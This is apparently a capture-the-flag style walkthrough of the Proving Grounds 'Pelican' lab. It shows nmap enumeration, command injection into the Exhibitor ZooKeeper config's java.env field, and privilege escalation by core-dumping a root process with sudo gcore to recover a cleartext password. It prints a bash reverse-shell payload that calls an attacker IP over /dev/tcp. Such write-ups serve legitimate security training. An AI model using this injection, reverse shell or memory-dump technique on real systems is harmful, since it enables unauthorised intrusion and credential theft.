# 📝 Proving Grounds Practice: Pelican

## 🔍 Target Overview
* **Box Name:** Pelican
* **Platform:** OffSec Proving Grounds (Practice)
* **OS:** Linux (Debian)
* **Target IP:** 192.168.58.98

## 📊 Executive Summary
In this lab, an initial foothold was achieved by exploiting an unauthenticated command injection vulnerability within a Zookeeper management interface (Exhibitor) running on port 8080. Privilege escalation to root was subsequently accomplished by leveraging `sudo` rights on the `gcore` utility to dump the memory of a running root process, revealing the root password in cleartext.

---

## ⚔️ Phase 1: Enumeration

The engagement began with a comprehensive Nmap scan to identify the exposed attack surface.

```bash
# Nmap Initial Scan
nmap -p- -sC -sV 192.168.58.98
```
<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/bd041d2a-8997-4340-ae1e-0d7dd409bdd7" />

Nmap Scan Results:
The scan revealed a diverse set of services:
22/tcp, 2222/tcp: OpenSSH 7.9p1
139/tcp, 445/tcp: Samba smbd (WORKGROUP)
631/tcp: CUPS 2.2
2181/tcp: Zookeeper 3.4.6-1569965
8080/tcp: HTTP Jetty 1.0 (Error 404 Not Found)
8081/tcp: HTTP nginx 1.14.2 (Redirects to http://192.168.58.98:8080/exhibitor/v1/ui/index.html)
34051/tcp: Java RMI

---

Analysis & Strategy:
The presence of Zookeeper (2181) and two web services (8080, 8081) immediately drew attention. The Nmap output for port 8081 indicated a redirect to an exhibitor UI running on port 8080. Exhibitor is a supervisor system for Zookeeper. My primary strategy was to investigate this web interface for misconfigurations or known vulnerabilities.

## 🔓 Phase 2: Initial Foothold (Command Injection)

Navigating to the web interface at http://192.168.58.98:8080/exhibitor/v1/ui/index.html revealed the "Exhibitor for ZooKeeper" control panel.

While exploring the "Config" tab, I noticed input fields that are often processed directly by the underlying system. Researching vulnerabilities for this specific service led me to a known command injection flaw within the java.env script configuration field.

To exploit this, I set up a netcat listener on my attacking machine and injected a standard bash reverse shell payload into the java.env script input:

```bash
# Injected Payload in Exhibitor UI
export JAVA_OPTS="-Xms1000m -Xmx1000m"
bash -c 'bash -i >& /dev/tcp/192.168.54.98/4444 0>&1'
```

<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/9c268a91-5fbd-4cbb-8c93-9a08750f9001" />

<img width="250" height="125" alt="image" src="https://github.com/user-attachments/assets/6b42da73-2fcf-453b-9041-9ef03f746167" />

Got a low priviledged shell for username charles 

<img width="400" height="60" alt="image" src="https://github.com/user-attachments/assets/393b5a64-e1b7-4517-bc7d-1acf49e3b1ab" />

---

## 🚀 Phase 3: Privilege Escalation (Core Dump Analysis)

With a low-privileged shell established, I began internal enumeration. Checking for sudo privileges yielded immediate results.

```Bash
charles@pelican:~$ sudo -l
The output indicated that the user charles could run the /usr/bin/gcore command as root without a password.
```

<img width="350" height="65" alt="image" src="https://github.com/user-attachments/assets/2773c7f6-4e94-41f0-ab09-9e8bf86750eb" />

The gcore utility generates a core dump (a memory snapshot) of a running process. To leverage this, I needed to find a sensitive process running as root.

I listed all processes running as root:

```Bash
charles@pelican:~$ ps aux | grep root
Reviewing the process list, I spotted a highly interesting process running with PID 494 (Note: PID may vary across resets): /usr/bin/password-store.
```

<img width="410" height="260" alt="image" src="https://github.com/user-attachments/assets/a0447761-8665-4394-9979-28001cda4e0e" />

<img width="550" height="160" alt="image" src="https://github.com/user-attachments/assets/2a9438ac-62c4-4d29-9e3b-0f2f9487bfca" />

I used my sudo privilege to run gcore against the PID of the password-store process, saving its memory contents to a file.

```Bash
charles@pelican:~$ sudo gcore -o output 494
```

<img width="350" height="60" alt="image" src="https://github.com/user-attachments/assets/b68d897a-d85b-4db0-911e-88cc4f39ec70" />

This generated a core dump file (e.g., output.494). Since core dumps contain the raw memory of the process, any cleartext strings handled by the application might be visible. I used the strings command, piped into less (or directly grepped), to analyze the dump.

<img width="325" height="125" alt="image" src="https://github.com/user-attachments/assets/2e875e6f-a946-41c8-b94d-cf0910b343d2" />

The analysis successfully revealed a cleartext password: ClogKingpinInning731.

I used this password with the su command to switch to the root user.

```Bash
charles@pelican:~$ su root
Password: ClogKingpinInning731
root@pelican:/home/charles#
```

<img width="220" height="65" alt="image" src="https://github.com/user-attachments/assets/5bbf8f86-9e3d-43ec-b211-12605ae82a3f" />

The privilege escalation was successful, resulting in full compromise of the Pelican machine.
